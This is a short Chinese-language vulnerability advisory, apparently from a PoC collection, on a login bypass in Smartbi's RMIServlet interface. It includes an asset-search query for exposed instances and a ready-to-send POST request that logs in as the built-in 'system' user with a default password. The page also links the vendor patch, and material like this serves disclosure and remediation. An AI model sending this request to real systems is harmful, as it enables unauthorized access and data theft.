# Smartbi RMIServlet 登陆绕过漏洞

## 漏洞描述

该漏洞源于 Smartbi 默认存在内置用户，在使用特定接口时，攻击者可绕过用户身份认证机制获取内置用户身份凭证，随后可使用获取的身份凭证调用后台接口，最终可能导致敏感信息泄露和代码执行。

## 漏洞影响

```
V7 <= Smartbi <=V10
```

## 网络测绘

```
app="SMARTBI"
```

## 漏洞复现

验证漏洞是否存在

```
http://your-ip/smartbi/vision/RMIServlet
```

出现以下回显证明漏洞存在

```
{"retCode":"CLIENT_USER_NOT_LOGIN","result":"尚未登录或会话过期"}
```

poc

```
POST /smartbi/vision/RMIServlet HTTP/1.1
Host: your-ip
Content-Type: application/x-www-form-urlencoded
 
className=UserService&methodName=loginFromDB&params=["system","0a"]
```

通过获取的Cookie登陆。

## 漏洞修复

官方已发布漏洞补丁及修复版本，请评估业务是否受影响后，酌情升级至安全版本：https://www.smartbi.com.cn/patchinfo
